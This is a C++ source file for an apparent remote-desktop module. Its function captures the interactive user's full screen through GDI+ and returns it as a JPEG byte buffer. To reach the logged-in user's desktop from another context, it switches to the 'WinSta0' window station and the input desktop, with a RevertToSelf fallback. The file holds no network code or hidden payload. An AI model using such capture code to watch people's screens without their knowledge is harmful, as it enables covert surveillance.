#include "mod_remote_desktop.hpp"
#include "misc.hpp"

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid){
    UINT  num = 0;          // number of image encoders
    UINT  size = 0;         // size of the image encoder array in bytes

    Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;

    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0)
        return -1;  // Failure

    pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL)
        return -1;  // Failure

    GetImageEncoders(num, size, pImageCodecInfo);

    for (UINT j = 0; j < num; ++j)
    {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
        {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;  // Success
        }
    }

    free(pImageCodecInfo);
    return -1;  // Failure
}

mod_RemoteDesktop::mod_RemoteDesktop() {
	return;
}

mod_RemoteDesktop::~mod_RemoteDesktop() {
	return;
}

std::vector<BYTE> mod_RemoteDesktop::getFrameBytes(ULONG quality) {
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    
    HWINSTA hWindowsStation = NULL;
    HDESK hInputDesktop = NULL;
    HDESK hOrigDesktop = NULL;
    HWND hDesktopWnd = NULL;
    HDC hdc = NULL;
    HDC hmemdc = NULL;
    HBITMAP hbmp = NULL;

    Gdiplus::Bitmap* pScreenShot = nullptr;
    IStream* oStream;
    HRESULT hr = S_OK;
    std::vector<BYTE> cBuffer;

    OSVERSIONINFO os;
    int xm = SM_CXVIRTUALSCREEN;
    int ym = SM_CYVIRTUALSCREEN;
    int xp = SM_XVIRTUALSCREEN;
    int yp = SM_YVIRTUALSCREEN;
    int sx = 0;
    int sy = 0;
    int sxpos = 0;
    int sypos = 0;

    HGLOBAL hGlobalMem = GlobalAlloc(GHND | GMEM_DDESHARE, 0);

    if (hGlobalMem == NULL) {
        goto EndSec;
    }

    os.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    if (!GetVersionEx(&os)) {
        DebugPrint("GetVersionEx failed\n");
        goto EndSec;
    }
    if (os.dwMajorVersion <= 4) {
        xm = SM_CXSCREEN;
        ym = SM_CYSCREEN;
    }

    hWindowsStation = OpenWindowStationA("WinSta0", FALSE, WINSTA_ALL_ACCESS);
    if (!hWindowsStation) {
        if (RevertToSelf()) {
            hWindowsStation = OpenWindowStationA("WinSta0", FALSE, WINSTA_ALL_ACCESS);
        }
    }
    if (!hWindowsStation) {
        DebugPrint("Couldnt get the Winsta0 Window Station\n");
        goto EndSec;
    }
    
    if (!SetProcessWindowStation(hWindowsStation)) {
        DebugPrint("Unable to set process windows station\n");
        goto EndSec;
    }
    hInputDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
    if (!hInputDesktop) {
        DebugPrint("OpenInputDesktop failed\n");
        goto EndSec;
    }
    hOrigDesktop = GetThreadDesktop(GetCurrentThreadId());
    SetThreadDesktop(hInputDesktop);
    hDesktopWnd = GetDesktopWindow();
    hdc = GetDC(hDesktopWnd);
    if (!hdc) {
        DebugPrint("GetDC failed\n");
        goto EndSec;
    }
    hmemdc = CreateCompatibleDC(hdc);
    if (!hmemdc) {
        DebugPrint("GetcomtabielDC failed\n");
        goto EndSec;
    }
    sx = GetSystemMetrics(xm);
    sy = GetSystemMetrics(ym);

    if (os.dwMajorVersion >= 4) {
        sxpos = GetSystemMetrics(xp);
        sypos = GetSystemMetrics(yp);
    }

    hbmp = CreateCompatibleBitmap(hdc, sx, sy);
    if (!hbmp) {
        DebugPrint("Createcompatiblebitmap failed\n");
        goto EndSec;
    }
    if (!SelectObject(hmemdc, hbmp)) {
        DebugPrint("select object failed\n");
        goto EndSec;
    }
    if (!BitBlt(hmemdc, 0, 0, sx, sy, hdc, sxpos, sypos, SRCCOPY)) {
        DebugPrint("bitblt failed\n");
        goto EndSec;
    }


    hr = CreateStreamOnHGlobal(hGlobalMem, TRUE, &oStream);
    if (hr != S_OK) {
        DebugPrint("CreateStreamOnHGlobal\n");
        goto EndSec;
    }

    STATSTG statstg;
    CLSID imageCLSID;
    
    Gdiplus::EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].NumberOfValues = 1;
    encoderParams.Parameter[0].Guid = Gdiplus::EncoderQuality;
    encoderParams.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].Value = &quality;

    GetEncoderClsid(L"image/jpeg", &imageCLSID);
    
    pScreenShot = new Gdiplus::Bitmap(hbmp, (HPALETTE)NULL);

    if (!pScreenShot) {
        DebugPrint("No se pudo reservar memoria para crear el bitmap");
        goto EndSec;
    }

    if (pScreenShot->Save(oStream, &imageCLSID, &encoderParams) != Gdiplus::Status::Ok) {
        DebugPrint("No se pudo guardar el buffer al stream");
        goto EndSec;
    }

    hr = oStream->Stat(&statstg, STATFLAG_NONAME);
    if (hr == S_OK) {
        ULONG bytes_read = 0;
        unsigned long long int uiBuffsize = statstg.cbSize.LowPart;
        cBuffer.resize(uiBuffsize);
        if (cBuffer.size() == uiBuffsize) {
            oStream->Seek({ 0 }, STREAM_SEEK_SET, NULL);
            hr = oStream->Read(cBuffer.data(), uiBuffsize, &bytes_read);
        }
    }

EndSec:

    if (pScreenShot) {
        delete pScreenShot;
        pScreenShot = nullptr;
    }

    Gdiplus::GdiplusShutdown(gdiplusToken);
    GlobalFree(hGlobalMem);

    if (hdc) {
        ReleaseDC(hDesktopWnd, hdc);
    }
    if (hmemdc) {
        DeleteDC(hmemdc);
    }
    if (hbmp) {
        DeleteObject(hbmp);
    }
    if (hOrigDesktop) {
        SetThreadDesktop(hOrigDesktop);
    }
    if (hWindowsStation) {
        CloseWindowStation(hWindowsStation);
    }
    if (hInputDesktop) {
        CloseDesktop(hInputDesktop);
    }

    return cBuffer;

}